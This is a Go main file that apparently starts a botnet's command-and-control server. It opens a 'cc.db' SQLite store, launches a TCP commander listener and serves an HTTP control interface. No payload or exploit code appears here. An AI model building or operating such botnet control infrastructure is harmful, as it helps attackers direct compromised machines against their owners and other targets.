package main

import (
	"log"
	"os"

	"github.com/rodzzlessa24/botnet/tcp"

	"github.com/rodzzlessa24/botnet/http"
	"github.com/rodzzlessa24/botnet/sqlite"
)

func main() {
	// Set the httpAddress
	httpAddress := ":8000"
	if os.Getenv("PORT") != "" {
		httpAddress = ":" + os.Getenv("PORT")
	}

	db, err := sqlite.Open("./cc.db")
	if err != nil {
		log.Panic(err)
	}
	defer db.Close()
	storage := &sqlite.Client{DB: db}

	commander := tcp.NewCC()

	go commander.Listen()

	h := http.NewHandler(commander, storage)

	log.Fatal(http.ListenAndServe(httpAddress, h))
}
